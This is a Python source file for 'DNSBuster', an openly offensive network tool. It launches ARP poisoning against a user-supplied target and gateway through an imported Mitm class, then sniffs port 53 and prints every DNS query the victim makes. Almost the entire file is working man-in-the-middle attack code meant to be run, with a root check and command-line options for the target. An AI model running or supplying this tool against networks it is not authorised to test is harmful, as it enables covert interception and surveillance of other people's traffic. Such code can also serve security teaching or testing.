from scapy.all import IP, DNS, conf, sniff
from mitm import Mitm

import sys
import os
import argparse
import threading


#Some color stuffs
white = '\033[1;97m'
green = '\033[1;32m'
blue = '\033[94m'
red = '\033[1;31m'
yellow = '\033[1;33m'
magenta = '\033[1;35m'
end = '\033[1;m'
info = '\033[1;33m[!]\033[1;m '
res = '\033[1;35m[*]\033[1;m '
que =  '\033[1;34m[?]\033[1;m '
bad = '\033[1;31m[-]\033[1;m '
good = '\033[1;32m[+]\033[1;m '
run = '\033[1;97m[~]\033[1;m '

__version__ = "0.1"
__banner__= """%s

 _____   ______     _    ______                             
(____ \ |  ___ \   | |  (____  \            _               
 _   \ \| |   | |   \ \  ____)  )_   _  ___| |_  ____  ____ 
| |   | | |   | |    \ \|  __  (| | | |/___)  _)/ _  )/ ___)
| |__/ /| |   | |_____) ) |__)  ) |_| |___ | |_( (/ /| |    
|_____/ |_|   |_(______/|______/ \____(___/ \___)____)_|    
                                                            
%s"""%(yellow, end)


interface = "wlo1"
conf.verb = 0
# set with conf.iface = "wlo1"



def DNSsniff(packet):
    if IP in packet:
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst # most likely router gateway
        if packet.haslayer(DNS):
            dns_layer = packet.getlayer(DNS)
            # parse only DNS queries
            
            if dns_layer.qr == 0:
                print(res+"Source:",ip_src,"-->",dns_layer.qd.qname)

def main():
    ap = argparse.ArgumentParser(description="DNSBuster")
    ap.add_argument("-i","--interface", required=True, help="Name of the interface used for the attack.")
    ap.add_argument("-t","--target", required=True, help="IP Address of the target")
    ap.add_argument("-g","--gateway", required=True, help="IP Address of the gateway")
    ap.add_argument("--timeout", help="Sent timeout for APR Poison packets", default="2")
    args = ap.parse_args()

    if os.geteuid() != 0:
        print(bad+"Need root privilages to run")
        sys.exit(1)

    mitm = Mitm(args.target, args.gateway)
    # mitm.setDaemon(True)

    # start ARP poisoning thread
    if mitm.check_init():
        print(info+"Starting ARP Poisoning on target %s"%(args.target))
        mitm.start()
    else:
        print(info+"Exiting...")
        sys.exit(1)

    try:
        sniff(iface=args.interface, filter="port 53", prn=DNSsniff, store=0)
        mitm.stop()
        mitm.join()
        print(info+"Stopping the DNSBuster ...")
    except KeyboardInterrupt:
        mitm.stop()
        mitm.join()
        print(info+"Stopping the DNSBuster ...")
        sys.exit(0)


if __name__ == '__main__':
    print(__banner__)
    main()
